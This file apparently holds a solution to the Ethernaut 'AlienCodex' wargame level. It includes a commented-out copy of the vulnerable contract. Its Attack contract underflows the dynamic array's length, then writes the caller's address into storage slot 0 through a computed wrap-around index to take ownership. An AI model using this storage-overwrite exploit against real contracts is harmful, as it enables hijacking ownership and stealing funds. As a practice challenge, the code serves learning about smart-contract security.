// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import '../helpers/Ownable-05.sol';

// contract AlienCodex is Ownable {

//   bool public contact;
//   bytes32[] public codex;

//   modifier contacted() {
//     assert(contact);
//     _;
//   }
  
//   function makeContact() public {
//     contact = true;
//   }

//   function record(bytes32 _content) contacted public {
//     codex.push(_content);
//   }

//   function retract() contacted public {
//     codex.length--;
//   }

//   function revise(uint i, bytes32 _content) contacted public {
//     codex[i] = _content;
//   }
// }

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract Attack {

    constructor(IAlienCodex target) {

        target.makeContact();
        target.retract();
        uint h = uint256(keccak256(abi.encode(uint(1))));
        uint i;
        unchecked {
            i -= h;
        }

        target.revise(i,bytes32(uint256(uint160(msg.sender))));
    }
}
